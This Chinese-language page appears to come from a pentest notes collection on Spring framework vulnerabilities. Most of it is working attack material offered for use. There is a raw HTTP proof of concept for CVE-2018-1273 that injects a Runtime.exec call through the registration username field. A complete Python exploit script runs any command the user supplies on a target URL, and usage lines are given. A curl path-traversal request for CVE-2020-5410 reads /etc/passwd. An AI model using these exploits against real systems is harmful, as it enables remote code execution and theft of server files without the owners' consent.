---
title: Spring
---

## 应用简介

Spring 是最受欢迎的企业级 Java 应用程序开发框架

[Spring Messaging 远程命令执行漏洞（CVE-2018-1270）](https://vulhub.org/#/environments/spring/CVE-2018-1270/)

Spring Boot 2.x Actuator配置不当RCE漏洞复现

https://xz.aliyun.com/t/7480

Spring Boot漏洞复现

https://xz.aliyun.com/t/7811

## [CVE-2018-1273]-Spring Data Commons 远程命令执行漏洞

在注册的时候抓包，并修改成如下数据包

POC

```http
POST /users?page=&size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```

EXP

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub
# telegram:t.me/zhzyker

import requests
import sys

if len(sys.argv)!=3:
    print('+----------------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                       +')
    print('+      Spring Data Commons Remote Code Execution (No display)                +')
    print('+----------------------------------------------------------------------------+')
    print('+ USE: python3 cve-2018-1273_cmd.py <url> "<cmd>"                            +')
    print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 "touch /tmp/exphub"  +')
    print('+ VER: Spring Data Commons 1.13 to 1.13.10                                   +')
    print('+      Spring Data Commons 2.0 to 2.0.5                                      +')
    print('+----------------------------------------------------------------------------+')
    sys.exit()
    
url = sys.argv[1]
cmd = sys.argv[2]
vuln = url + "/users"  

headers = {
    'Host': "localhost:8080",
    'Connection': "keep-alive",
    'Content-Length': "120",
    'Pragma': "no-cache",
    'Cache-Control': "no-cache",
    'Origin': "http://localhost:8080",
    'Upgrade-Insecure-Requests': "1",
    'Content-Type': "application/x-www-form-urlencoded",
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    'Referer': "http://localhost:8080/users?page=0&size=5",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8"
    }
    
payload = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=" % cmd

try:
    r = requests.post(vuln, data=payload, headers=headers)
    if r.status_code == 500:
        print ("[+] Code executed successfully")
    else:
        print ("[-] Target Not CVE-2018-1273 Vuln, Good Luck")
except:
    print ("[-] Target Not CVE-2018-1273 Vuln, Good Luck")
```

```bash
python cve-2018-1273_cmd.py <url> "<cmd>"
```

## [CVE-2020-5410]-Spring Cloud Config 目录穿越

影响版本：  

- 2.2.0 to 2.2.2  
- 2.1.0 to 2.1.8  

poc：

```java
curl http://127.0.0.1:8888/..%252F..%252Fetc%252Fpasswd%23/CESHI
```